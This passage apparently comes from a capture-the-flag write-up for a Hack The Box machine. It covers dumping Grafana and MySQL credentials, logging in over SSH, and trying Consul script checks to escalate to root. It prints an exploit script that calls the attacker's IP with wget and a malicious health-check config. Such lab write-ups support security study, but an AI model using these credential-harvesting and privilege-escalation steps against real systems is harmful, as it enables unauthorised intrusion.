<span class="na">Host</span><span class="p">:</span> <span class="s">target.htb:3000</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span>
<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">Cookie</span><span class="p">:</span> <span class="s">redirect_to=%2F</span>
<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
</pre></td></tr></tbody></table></code></div></div>

<p>I copied the database locally and looked around. The <code class="language-plaintext highlighter-rouge">user</code> table looked promising. But it only contained the admin user, and I already had their password.</p>

<div class="language-sql highlighter-rouge"><div class="code-header">
        <span data-label-text="Sql"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre></td><td class="rouge-code"><pre><span class="err">$</span> <span class="n">sqlite3</span> <span class="n">db</span><span class="p">.</span><span class="n">db</span>    
<span class="n">SQLite</span> <span class="k">version</span> <span class="mi">3</span><span class="p">.</span><span class="mi">39</span><span class="p">.</span><span class="mi">4</span> <span class="mi">2022</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">29</span> <span class="mi">15</span><span class="p">:</span><span class="mi">55</span><span class="p">:</span><span class="mi">41</span>
<span class="n">Enter</span> <span class="nv">".help"</span> <span class="k">for</span> <span class="k">usage</span> <span class="n">hints</span><span class="p">.</span>

<span class="n">sqlite</span><span class="o">&gt;</span> <span class="p">.</span><span class="n">tables</span>
<span class="n">alert</span>                       <span class="n">login_attempt</span>             
<span class="n">alert_configuration</span>         <span class="n">migration_log</span>             
<span class="n">alert_instance</span>              <span class="n">ngalert_configuration</span>     
<span class="n">alert_notification</span>          <span class="n">org</span>                       
<span class="n">alert_notification_state</span>    <span class="n">org_user</span>                  
<span class="n">alert_rule</span>                  <span class="n">playlist</span>                  
<span class="n">alert_rule_tag</span>              <span class="n">playlist_item</span>             
<span class="n">alert_rule_version</span>          <span class="n">plugin_setting</span>            
<span class="n">annotation</span>                  <span class="n">preferences</span>               
<span class="n">annotation_tag</span>              <span class="n">quota</span>                     
<span class="n">api_key</span>                     <span class="n">server_lock</span>               
<span class="n">cache_data</span>                  <span class="k">session</span>                   
<span class="n">dashboard</span>                   <span class="n">short_url</span>                 
<span class="n">dashboard_acl</span>               <span class="n">star</span>                      
<span class="n">dashboard_provisioning</span>      <span class="n">tag</span>                       
<span class="n">dashboard_snapshot</span>          <span class="n">team</span>                      
<span class="n">dashboard_tag</span>               <span class="n">team_member</span>               
<span class="n">dashboard_version</span>           <span class="n">temp_user</span>                 
<span class="n">data_source</span>                 <span class="n">test_data</span>                 
<span class="n">kv_store</span>                    <span class="k">user</span>                      
<span class="n">library_element</span>             <span class="n">user_auth</span>                 
<span class="n">library_element_connection</span>  <span class="n">user_auth_token</span>           

<span class="n">sqlite</span><span class="o">&gt;</span> <span class="k">Select</span> <span class="o">*</span> <span class="k">From</span> <span class="k">user</span><span class="p">;</span>
<span class="mi">1</span><span class="o">|</span><span class="mi">0</span><span class="o">|</span><span class="k">admin</span><span class="o">|</span><span class="k">admin</span><span class="o">@</span><span class="n">localhost</span><span class="o">||</span><span class="n">dad0e56900c3be93ce114804726f78c91e82a0f0f0f6b248da419a0cac6157e02806498f1f784146715caee5bad1506ab069</span><span class="o">|</span><span class="mi">0</span><span class="n">X27trve2u</span><span class="o">|</span><span class="n">f960YdtaMF</span><span class="o">||</span><span class="mi">1</span><span class="o">|</span><span class="mi">1</span><span class="o">|</span><span class="mi">0</span><span class="o">||</span><span class="mi">2022</span><span class="o">-</span><span class="mi">03</span><span class="o">-</span><span class="mi">13</span> <span class="mi">20</span><span class="p">:</span><span class="mi">26</span><span class="p">:</span><span class="mi">45</span><span class="o">|</span><span class="mi">2022</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">01</span> <span class="mi">22</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="mi">38</span><span class="o">|</span><span class="mi">0</span><span class="o">|</span><span class="mi">2022</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="mi">11</span> <span class="mi">13</span><span class="p">:</span><span class="mi">23</span><span class="p">:</span><span class="mi">59</span><span class="o">|</span><span class="mi">0</span>
<span class="n">sqlite</span><span class="o">&gt;</span> 
</pre></td></tr></tbody></table></code></div></div>

<p>The <code class="language-plaintext highlighter-rouge">data_source</code> table was more interesting.</p>

<div class="language-sql highlighter-rouge"><div class="code-header">
        <span data-label-text="Sql"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre></td><td class="rouge-code"><pre><span class="n">sqlite</span><span class="o">&gt;</span> <span class="k">Select</span> <span class="o">*</span> <span class="k">From</span> <span class="n">sqlite_master</span> <span class="k">Where</span> <span class="n">name</span> <span class="o">=</span> <span class="s1">'data_source'</span><span class="p">;</span>
<span class="k">table</span><span class="o">|</span><span class="n">data_source</span><span class="o">|</span><span class="n">data_source</span><span class="o">|</span><span class="mi">41</span><span class="o">|</span><span class="k">CREATE</span> <span class="k">TABLE</span> <span class="nv">`data_source`</span> <span class="p">(</span>
<span class="nv">`id`</span> <span class="nb">INTEGER</span> <span class="k">PRIMARY</span> <span class="k">KEY</span> <span class="n">AUTOINCREMENT</span> <span class="k">NOT</span> <span class="k">NULL</span>
<span class="p">,</span> <span class="nv">`org_id`</span> <span class="nb">INTEGER</span> <span class="k">NOT</span> <span class="k">NULL</span>
<span class="p">,</span> <span class="nv">`version`</span> <span class="nb">INTEGER</span> <span class="k">NOT</span> <span class="k">NULL</span>
<span class="p">,</span> <span class="nv">`type`</span> <span class="nb">TEXT</span> <span class="k">NOT</span> <span class="k">NULL</span>
<span class="p">,</span> <span class="nv">`name`</span> <span class="nb">TEXT</span> <span class="k">NOT</span> <span class="k">NULL</span>
<span class="p">,</span> <span class="nv">`access`</span> <span class="nb">TEXT</span> <span class="k">NOT</span> <span class="k">NULL</span>
<span class="p">,</span> <span class="nv">`url`</span> <span class="nb">TEXT</span> <span class="k">NOT</span> <span class="k">NULL</span>
<span class="p">,</span> <span class="nv">`password`</span> <span class="nb">TEXT</span> <span class="k">NULL</span>
<span class="p">,</span> <span class="nv">`user`</span> <span class="nb">TEXT</span> <span class="k">NULL</span>
<span class="p">,</span> <span class="nv">`database`</span> <span class="nb">TEXT</span> <span class="k">NULL</span>
<span class="p">,</span> <span class="nv">`basic_auth`</span> <span class="nb">INTEGER</span> <span class="k">NOT</span> <span class="k">NULL</span>
<span class="p">,</span> <span class="nv">`basic_auth_user`</span> <span class="nb">TEXT</span> <span class="k">NULL</span>
<span class="p">,</span> <span class="nv">`basic_auth_password`</span> <span class="nb">TEXT</span> <span class="k">NULL</span>
<span class="p">,</span> <span class="nv">`is_default`</span> <span class="nb">INTEGER</span> <span class="k">NOT</span> <span class="k">NULL</span>
<span class="p">,</span> <span class="nv">`json_data`</span> <span class="nb">TEXT</span> <span class="k">NULL</span>
<span class="p">,</span> <span class="nv">`created`</span> <span class="nb">DATETIME</span> <span class="k">NOT</span> <span class="k">NULL</span>
<span class="p">,</span> <span class="nv">`updated`</span> <span class="nb">DATETIME</span> <span class="k">NOT</span> <span class="k">NULL</span>
<span class="p">,</span> <span class="nv">`with_credentials`</span> <span class="nb">INTEGER</span> <span class="k">NOT</span> <span class="k">NULL</span> <span class="k">DEFAULT</span> <span class="mi">0</span><span class="p">,</span> <span class="nv">`secure_json_data`</span> <span class="nb">TEXT</span> <span class="k">NULL</span><span class="p">,</span> <span class="nv">`read_only`</span> <span class="nb">INTEGER</span> <span class="k">NULL</span><span class="p">,</span> <span class="nv">`uid`</span> <span class="nb">TEXT</span> <span class="k">NOT</span> <span class="k">NULL</span> <span class="k">DEFAULT</span> <span class="mi">0</span><span class="p">)</span>

<span class="n">sqlite</span><span class="o">&gt;</span> <span class="k">Select</span> <span class="o">*</span> <span class="k">From</span> <span class="n">data_source</span><span class="p">;</span>
<span class="mi">2</span><span class="o">|</span><span class="mi">1</span><span class="o">|</span><span class="mi">1</span><span class="o">|</span><span class="n">mysql</span><span class="o">|</span><span class="n">mysql</span><span class="p">.</span><span class="n">yaml</span><span class="o">|</span><span class="n">proxy</span><span class="o">||</span><span class="n">REDACTED</span><span class="o">|</span><span class="n">grafana</span><span class="o">|</span><span class="n">grafana</span><span class="o">|</span><span class="mi">0</span><span class="o">|||</span><span class="mi">0</span><span class="o">|</span><span class="p">{}</span><span class="o">|</span><span class="mi">2022</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">01</span> <span class="mi">22</span><span class="p">:</span><span class="mi">43</span><span class="p">:</span><span class="mi">03</span><span class="o">|</span><span class="mi">2022</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="mi">11</span> <span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mi">10</span><span class="o">|</span><span class="mi">0</span><span class="o">|</span><span class="p">{}</span><span class="o">|</span><span class="mi">1</span><span class="o">|</span><span class="n">uKewFgM4z</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Port 3306 was open, so I tried connecting to it.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>mysql <span class="nt">-h</span> target <span class="nt">-ugrafana</span> <span class="nt">-pREDACTED</span>
Welcome to the MariaDB monitor.  Commands end with <span class="p">;</span> or <span class="se">\g</span><span class="nb">.</span>
Your MySQL connection <span class="nb">id </span>is 23
Server version: 8.0.30-0ubuntu0.20.04.2 <span class="o">(</span>Ubuntu<span class="o">)</span>

Copyright <span class="o">(</span>c<span class="o">)</span> 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type <span class="s1">'help;'</span> or <span class="s1">'\h'</span> <span class="k">for </span>help. Type <span class="s1">'\c'</span> to clear the current input statement.

MySQL <span class="o">[(</span>none<span class="o">)]&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<p>It worked, so I looked around. There was a suspicious <code class="language-plaintext highlighter-rouge">whackywidget</code> database.</p>

<div class="language-sql highlighter-rouge"><div class="code-header">
        <span data-label-text="Sql"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
</pre></td><td class="rouge-code"><pre><span class="n">MySQL</span> <span class="p">[(</span><span class="k">none</span><span class="p">)]</span><span class="o">&gt;</span> <span class="k">Show</span> <span class="n">Databases</span><span class="p">;</span>
<span class="o">+</span><span class="c1">--------------------+</span>
<span class="o">|</span> <span class="k">Database</span>           <span class="o">|</span>
<span class="o">+</span><span class="c1">--------------------+</span>
<span class="o">|</span> <span class="n">grafana</span>            <span class="o">|</span>
<span class="o">|</span> <span class="n">information_schema</span> <span class="o">|</span>
<span class="o">|</span> <span class="n">mysql</span>              <span class="o">|</span>
<span class="o">|</span> <span class="n">performance_schema</span> <span class="o">|</span>
<span class="o">|</span> <span class="n">sys</span>                <span class="o">|</span>
<span class="o">|</span> <span class="n">whackywidget</span>       <span class="o">|</span>
<span class="o">+</span><span class="c1">--------------------+</span>
<span class="mi">6</span> <span class="k">rows</span> <span class="k">in</span> <span class="k">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">059</span> <span class="n">sec</span><span class="p">)</span>

<span class="n">MySQL</span> <span class="p">[(</span><span class="k">none</span><span class="p">)]</span><span class="o">&gt;</span> <span class="n">use</span> <span class="n">whackywidget</span><span class="p">;</span>
<span class="n">Reading</span> <span class="k">table</span> <span class="n">information</span> <span class="k">for</span> <span class="k">completion</span> <span class="k">of</span> <span class="k">table</span> <span class="k">and</span> <span class="k">column</span> <span class="k">names</span>
<span class="n">You</span> <span class="n">can</span> <span class="n">turn</span> <span class="k">off</span> <span class="n">this</span> <span class="n">feature</span> <span class="k">to</span> <span class="k">get</span> <span class="n">a</span> <span class="n">quicker</span> <span class="n">startup</span> <span class="k">with</span> <span class="o">-</span><span class="n">A</span>

<span class="k">Database</span> <span class="n">changed</span>

<span class="n">MySQL</span> <span class="p">[</span><span class="n">whackywidget</span><span class="p">]</span><span class="o">&gt;</span> <span class="k">Show</span> <span class="n">Tables</span><span class="p">;</span>
<span class="o">+</span><span class="c1">------------------------+</span>
<span class="o">|</span> <span class="n">Tables_in_whackywidget</span> <span class="o">|</span>
<span class="o">+</span><span class="c1">------------------------+</span>
<span class="o">|</span> <span class="n">users</span>                  <span class="o">|</span>
<span class="o">+</span><span class="c1">------------------------+</span>
<span class="mi">1</span> <span class="k">row</span> <span class="k">in</span> <span class="k">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">089</span> <span class="n">sec</span><span class="p">)</span>

<span class="n">MySQL</span> <span class="p">[</span><span class="n">whackywidget</span><span class="p">]</span><span class="o">&gt;</span> <span class="k">Select</span> <span class="o">*</span> <span class="k">From</span> <span class="n">users</span><span class="p">;</span>
<span class="o">+</span><span class="c1">-----------+------------------------------------------+</span>
<span class="o">|</span> <span class="k">user</span>      <span class="o">|</span> <span class="n">pass</span>                                     <span class="o">|</span>
<span class="o">+</span><span class="c1">-----------+------------------------------------------+</span>
<span class="o">|</span> <span class="n">developer</span> <span class="o">|</span> <span class="n">SOME_BASE64</span>                              <span class="o">|</span>
<span class="o">+</span><span class="c1">-----------+------------------------------------------+</span>
<span class="mi">1</span> <span class="k">row</span> <span class="k">in</span> <span class="k">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">198</span> <span class="n">sec</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div></div>

<p>The database had a <code class="language-plaintext highlighter-rouge">users</code> table that contained a base64 encoded password. I decoded it, and used the password to SSH to the server as <code class="language-plaintext highlighter-rouge">developer</code> and get the user flag.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">echo</span> <span class="nt">-n</span>  SOME_BASE64 | <span class="nb">base64</span> <span class="nt">-d</span>
REDACTED

<span class="nv">$ </span>ssh developer@target   
developer@target<span class="s1">'s password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-126-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri 11 Nov 2022 02:13:46 PM UTC

  System load:           0.07
  Usage of /:            80.9% of 5.07GB
  Memory usage:          38%
  Swap usage:            0%
  Processes:             226
  Users logged in:       0
  IPv4 address for eth0: 10.129.47.199
  IPv6 address for eth0: dead:beef::250:56ff:feb9:ca73

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Fri Nov 11 14:13:39 2022 from 10.10.14.143

developer@ambassador:~$ ls
snap  user.txt

developer@ambassador:~$ cat user.txt 
REDACTED
</span></pre></td></tr></tbody></table></code></div></div>

<h2 id="privilege-escalation"><span class="mr-2">Privilege Escalation</span><a href="#privilege-escalation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<h3 id="static-site-generator"><span class="mr-2">Static Site Generator</span><a href="#static-site-generator" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>Once connected, I started looking around the server. I quickly found a folder that contained the source for the site on port 80.</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
</pre></td><td class="rouge-code"><pre>developer@ambassador:~$ ls -l /
total 68
lrwxrwxrwx   1 root      root          7 Feb 23  2022 bin -&gt; usr/bin
drwxr-xr-x   4 root      root       4096 Sep 27 14:50 boot
drwxr-xr-x  18 root      root       4000 Nov 12 12:06 dev
drwxr-xr-x  10 developer developer  4096 Sep  2 01:39 development-machine-documentation
drwxr-xr-x 103 root      root       4096 Sep 27 14:49 etc
drwxr-xr-x   3 root      root       4096 Mar 13  2022 home
lrwxrwxrwx   1 root      root          7 Feb 23  2022 lib -&gt; usr/lib
lrwxrwxrwx   1 root      root          9 Feb 23  2022 lib32 -&gt; usr/lib32
...

developer@ambassador:~$ cd /development-machine-documentation/

developer@ambassador:/development-machine-documentation$ ls -l
total 40
drwxr-xr-x 2 developer developer 4096 Mar 13  2022 archetypes
-rw-r--r-- 1 developer developer  114 Sep  2 01:37 config.toml
drwxr-xr-x 3 developer developer 4096 Mar 13  2022 content
drwxr-xr-x 2 developer developer 4096 Mar 13  2022 data
-rwxr-xr-x 1 developer developer  491 Sep  1 21:55 deploy.sh
drwxr-xr-x 3 developer developer 4096 Mar 13  2022 layouts
drwxr-xr-x 7 root      root      4096 Sep  2 01:37 public
drwxr-xr-x 3 developer developer 4096 Mar 13  2022 resources
drwxr-xr-x 2 developer developer 4096 Mar 13  2022 static
drwxr-xr-x 3 developer developer 4096 Mar 13  2022 themes

developer@ambassador:/development-machine-documentation$ cat deploy.sh 
#!/bin/bash

set -e

#OLD_VERSION=$(grep version config.toml | cut -d " " -f 3 | cut -d "'" -f 2)
NEW_VERSION=$(date -I)

# update version in config.toml
sed -i "/version =/c\version = '$NEW_VERSION' # Do not update this manually, deploy.sh will handle it" config.toml

# build the site
rm -rf public
hugo -D

# backup the old site in a .zip
#zip -r /var/www/backups/$OLD_VERSION.zip /var/www/html

# put new site in directory for serving
rm -rf /var/www/html/*
cp -r public/* /var/www/html
</pre></td></tr></tbody></table></code></div></div>

<p>The deploy script was using the <a href="https://gohugo.io/">Hugo static site generator</a> to build the site from Markdown files.</p>

<p>I listed the content of <code class="language-plaintext highlighter-rouge">public</code> and the webroot. It looked like the deploy script was being run by root.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre></td><td class="rouge-code"><pre>developer@ambassador:/development-machine-documentation<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span> public/
total 36
<span class="nt">-rw-r--r--</span> 1 root root 1793 Sep  2 01:37 404.html
drwxr-xr-x 3 root root 4096 Sep  2 01:37 ananke
drwxr-xr-x 2 root root 4096 Sep  2 01:37 categories
drwxr-xr-x 2 root root 4096 Mar 13  2022 images
<span class="nt">-rw-r--r--</span> 1 root root 3654 Sep  2 01:37 index.html
<span class="nt">-rw-r--r--</span> 1 root root 1230 Sep  2 01:37 index.xml
drwxr-xr-x 4 root root 4096 Sep  2 01:37 posts
<span class="nt">-rw-r--r--</span> 1 root root  645 Sep  2 01:37 sitemap.xml
drwxr-xr-x 2 root root 4096 Sep  2 01:37 tags

developer@ambassador:/development-machine-documentation<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span> /var/www/html/
total 36
<span class="nt">-rw-r--r--</span> 1 root root 1793 Sep  2 01:37 404.html
drwxr-xr-x 3 root root 4096 Sep  2 01:37 ananke
drwxr-xr-x 2 root root 4096 Sep  2 01:37 categories
drwxr-xr-x 2 root root 4096 Sep  2 01:37 images
<span class="nt">-rw-r--r--</span> 1 root root 3654 Sep  2 01:37 index.html
<span class="nt">-rw-r--r--</span> 1 root root 1230 Sep  2 01:37 index.xml
drwxr-xr-x 4 root root 4096 Sep  2 01:37 posts
<span class="nt">-rw-r--r--</span> 1 root root  645 Sep  2 01:37 sitemap.xml
drwxr-xr-x 2 root root 4096 Sep  2 01:37 tags
</pre></td></tr></tbody></table></code></div></div>

<p>I tried modifying the Markdown for the post and the deploy script. I thought that if the deploy script was running on a cron I could get code execution as root this way. But it never ran, so I moved to something else.</p>

<h3 id="consul"><span class="mr-2">Consul</span><a href="#consul" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>When I extracted <code class="language-plaintext highlighter-rouge">/etc/passwd</code> with the LFI, I saw that the server had a <code class="language-plaintext highlighter-rouge">consul</code> user. I looked to see if <a href="https://www.consul.io/">Consul</a> was running.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>developer@ambassador:~<span class="nv">$ </span>ps aux | <span class="nb">grep </span>consul
root        1022  0.5  3.7 794292 74328 ?        Ssl  15:25   0:02 /usr/bin/consul agent <span class="nt">-config-dir</span><span class="o">=</span>/etc/consul.d/config.d <span class="nt">-config-file</span><span class="o">=</span>/etc/consul.d/consul.hcl
</pre></td></tr></tbody></table></code></div></div>

<p>It was running. I looked into the configuration folder and saw that my user could write some configurations.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre></td><td class="rouge-code"><pre>developer@ambassador:~<span class="nv">$ </span><span class="nb">cd</span> /etc/consul.d/

developer@ambassador:/etc/consul.d<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
total 24
drwxr-xr-x   3 consul consul    4096 Sep 27 14:49 <span class="nb">.</span>
drwxr-xr-x 103 root   root      4096 Sep 27 14:49 ..
drwx-wx---   2 root   developer 4096 Nov 11 16:04 config.d
<span class="nt">-rw-r--r--</span>   1 consul consul       0 Feb 28  2022 consul.env
<span class="nt">-rw-r--r--</span>   1 consul consul    5303 Mar 14  2022 consul.hcl
<span class="nt">-rw-r--r--</span>   1 consul consul     160 Mar 15  2022 README

developer@ambassador:/etc/consul.d<span class="nv">$ </span><span class="nb">echo </span>TEST <span class="o">&gt;</span> config.d/test

developer@ambassador:/etc/consul.d<span class="nv">$ </span><span class="nb">cat </span>config.d/test
TEST
</pre></td></tr></tbody></table></code></div></div>

<p>The <code class="language-plaintext highlighter-rouge">consul.hcl</code> also had an interesting setting at the end.</p>

<div class="language-ini highlighter-rouge"><div class="code-header">
        <span data-label-text="Ini"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="py">enable_script_checks</span> <span class="p">=</span> <span class="s">true</span>
</pre></td></tr></tbody></table></code></div></div>

<p>I looked at the <a href="https://developer.hashicorp.com/consul/docs/agent/config/cli-flags#_enable_script_checks">documentation of this setting</a> and saw a warning saying it could be used to get remote code execution.</p>

<blockquote>
  <p>enable_script_checks: enable script checks regardless of how they are defined.
Security Warning: Enabling script checks in some configurations may introduce a remote execution vulnerability which is known to be targeted by malware. We strongly recommend enable_local_script_checks instead. See this blog post for more details.</p>
</blockquote>

<p>At this point, I thought I had an easy way to get root. I had to create a <a href="https://developer.hashicorp.com/consul/tutorials/developer-discovery/service-registration-health-checks">health check script</a> that would open a reverse shell to my machine and drop it in <code class="language-plaintext highlighter-rouge">/etc/consul.d/config.d/</code> to get it executed.</p>

<p>To test it, I create a small script that would hit my web server.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre>developer@ambassador:~<span class="nv">$ </span><span class="nb">cat</span> /tmp/exploit.sh 
<span class="c">#!/bin/bash</span>

wget http://10.10.14.143/consul
</pre></td></tr></tbody></table></code></div></div>

<p>I created the configuration file and copied it to the folder I could write to.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td class="rouge-code"><pre>developer@ambassador:~<span class="nv">$ </span><span class="nb">cat </span>eric.json
<span class="o">{</span>
    <span class="s2">"check"</span>: <span class="o">{</span>
            <span class="s2">"name"</span>: <span class="s2">"eric"</span>,
            <span class="s2">"args"</span>: <span class="o">[</span>
              <span class="s2">"/tmp/exploit.sh"</span>
            <span class="o">]</span>,
            <span class="s2">"interval"</span>: <span class="s2">"10s"</span>,
            <span class="s2">"timeout"</span>: <span class="s2">"1s"</span>
    <span class="o">}</span>
<span class="o">}</span>
developer@ambassador:~<span class="nv">$ </span><span class="nb">cp </span>eric.json /etc/consul.d/config.d/
</pre></td></tr></tbody></table></code></div></div>

<p>Then I waited, hoping that just dropping the configuration file was enough to get Consul to read it. It was not. I needed to find a way to get the service to reload its configuration. But it was running as root, so I could not restart it.</p>

<p>I tried using the command line to register my service.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>consul services register /etc/consul.d/config.d/eric.json
</pre></td></tr></tbody></table></code></div></div>

<p>It returned without any errors, but it did not do anything.</p>

<p>I also tried the API to register it. This time I got a <code class="language-plaintext highlighter-rouge">Permission denied</code> error.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>developer@ambassador:/opt/my-app/whackywidget<span class="nv">$ </span>curl <span class="nt">--request</span> PUT <span class="nt">--data</span> @/home/developer/eric.json http://127.0.0.1:8500/v1/agent/service/register
Permission denied: token with AccessorID <span class="s1">'00000000-0000-0000-0000-000000000002'</span> lacks permission <span class="s1">'service:write'</span> on <span class="s2">"counting"</span>
</pre></td></tr></tbody></table></code></div></div>

<h3 id="whacky-widget"><span class="mr-2">Whacky Widget</span><a href="#whacky-widget" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>I got stuck here for some time. I was trying to find a way to register the new service or get Consul to restart. But only root could do that.</p>

<p>I found an app in <code class="language-plaintext highlighter-rouge">opt</code>.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre></td><td class="rouge-code"><pre>developer@ambassador:/etc/consul.d<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span> /opt/
total 8
drwxr-xr-x 4 consul consul 4096 Mar 13  2022 consul
drwxrwxr-x 5 root   root   4096 Mar 13  2022 my-app

